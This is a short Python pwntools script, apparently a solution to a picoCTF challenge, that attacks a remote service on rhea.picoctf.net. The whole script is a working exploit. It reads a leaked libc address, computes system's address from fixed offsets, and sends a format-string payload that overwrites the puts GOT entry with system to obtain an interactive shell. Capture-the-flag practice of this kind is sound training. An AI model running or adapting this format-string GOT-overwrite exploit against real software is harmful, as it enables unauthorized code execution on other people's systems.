from pwn import *

p = remote('rhea.picoctf.net', 55072)
context.arch = 'amd64'

p.recvuntil(b'setvbuf in libc: ')
setvbuf_addr = int(p.recvline().decode(), 16)

'''
0x7ffff7e583f0 <setvbuf>
0x7ffff7e2d760 <system>
0x404018 <puts@got.plt>
'''
system_addr = setvbuf_addr + (0x7ffff7e2d760-0x7ffff7e583f0)
puts_addr = 0x404018

print(setvbuf_addr, system_addr, puts_addr)

payload = fmtstr_payload(38, {puts_addr: system_addr}, write_size='byte')

p.sendline(payload)
p.interactive()
